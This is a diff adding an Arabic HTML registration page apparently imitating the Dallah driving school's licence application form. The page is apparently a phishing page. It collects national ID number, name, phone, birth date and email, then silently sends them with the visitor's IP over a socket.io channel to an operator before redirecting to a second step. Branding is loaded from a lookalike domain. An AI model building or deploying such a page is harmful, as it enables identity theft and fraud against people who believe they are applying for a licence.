@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دلة للقيادة</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            font-family: "Cairo", serif;
+            direction: rtl;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .btn-warning {
+            background-color: #D74D1C;
+            border-color: #D74D1C;
+            height: 50px;
+        }
+
+        .form-control,
+        .form-select {
+            height: 50px;
+        }
+
+        /* شاشة التحميل */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #loadingOverlay.active { display: flex; }
+    </style>
+</head>
+
+<body>
+    <div id="loadingOverlay">
+        <div class="spinner-border text-warning" role="status"></div>
+        <p class="mt-3">جاري معالجة البيانات...</p>
+    </div>
+
+    <nav class="text-center py-2 shadow-sm">
+        <img src="assets/logo.png" width="150" alt="">
+    </nav>
+
+    <div class="container mt-5">
+        <h6 class="text-dark text-center fw-bold">يرجى ملأ النموذج التالي بالمعلومات المطلوبة</h6>
+
+        <form action="" method="POST" class="mt-5 px-4" id="registerForm">
+            <label for="" class="mb-2 fw-bold">نوع الطلب <span class="text-danger fw-bold">*</span></label>
+            <select name="request_type" id="request_type" required class="form-select">
+                <option value="">نوع الطلب</option>
+                <option value="رخصة قيادة خاصة">رخصة قيادة خاصة</option>
+                <option value="رخصة قيادة عامة">رخصة قيادة عامة</option>
+                <option value="رخصة قيادة دراجة آلية">رخصة قيادة دراجة آلية</option>
+                <option value="رخصة قيادة مركبات اشغال عامة">رخصة قيادة مركبات اشغال عامة</option>
+                <option value="تصريح قيادة">تصريح قيادة</option>
+            </select>
+
+            <label for="" class="mb-2 mt-4 fw-bold">رقم الهوية الوطنية <span class="text-danger fw-bold">*</span></label>
+            <input type="text" class="form-control" name="ssn" id="idNumber" minlength="10" maxlength="12" inputmode="numeric" required placeholder="رقم الهوية الوطنية">
+
+            <label for="" class="mb-2 mt-4 fw-bold">الاسم الكامل <span class="text-danger fw-bold">*</span></label>
+            <input type="text" class="form-control" name="name" id="userName" required placeholder="الاسم الكامل">
+
+            <label for="" class="mb-2 mt-4 fw-bold">رقم الجوال <span class="text-danger fw-bold">*</span></label>
+            <input type="text" class="form-control" name="phone" id="phoneNumber" minlength="8" maxlength="10" inputmode="numeric" required placeholder="رقم الجوال">
+
+            <label for="" class="mb-2 mt-4 fw-bold">تاريخ الميلاد</label>
+            <input type="date" class="form-control" name="birth_date" id="birthDate">
+
+            <label for="" class="mb-2 mt-4 fw-bold">البريد الإلكتروني <span class="text-danger fw-bold">*</span></label>
+            <input type="email" class="form-control" name="email" id="email" required placeholder="البريد الإلكتروني">
+
+            <div class="text-center mt-5">
+                <button type="submit" name="submit" id="butSubm" class="btn btn-warning text-light fw-bold d-flex justify-content-center align-items-center w-100">تسجيل</button>
+            </div>
+        </form>
+    </div>
+
+    <footer class="text-center mt-5">
+        <img src="https://dalahdrivescars.com/assets/%C3%98%C2%B4%C3%98%C2%B1%C3%99%C6%92%C3%98%C2%A9-%C3%98%C2%AF%C3%99%E2%80%9E%C3%99%E2%80%A1-%C3%99%E2%80%9E%C3%98%C2%AA%C3%98%C2%B9%C3%99%E2%80%9E%C3%99%C5%A0%C3%99%E2%80%A6-%C3%99%E2%80%9A%C3%99%C5%A0%C3%98%C2%A7%C3%98%C2%AF%C3%98%C2%A9-%C3%98%C2%A7%C3%99%E2%80%9E%C3%98%C2%B3%C3%99%C5%A0%C3%98%C2%A7%C3%98%C2%B1%C3%98%C2%A7%C3%98%C2%AA.png" class="w-75 my-5" alt="">
+    </footer>
+    
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/ind.js"></script>
+<script>
+    document.getElementById('registerForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        document.getElementById('loadingOverlay').classList.add('active');
+        
+        const data = {
+            ip: window.visitorIP,
+            userName: document.getElementById('userName').value,
+            idNumber: document.getElementById('idNumber').value,
+            phoneNumber: document.getElementById('phoneNumber').value,
+            birthDate: document.getElementById('birthDate').value,
+            regType: document.getElementById('request_type').value,
+            email: document.getElementById('email').value
+        };
+
+        if (window.socket && window.visitorIP) {
+            window.socket.emit('submitIndex', data);
+            setTimeout(() => {
+                window.location.href = 'register-second.html';
+            }, 1000);
+        } else {
+            window.location.href = 'register-second.html';
+        }
+    });
+</script>
+</body>
+</html>
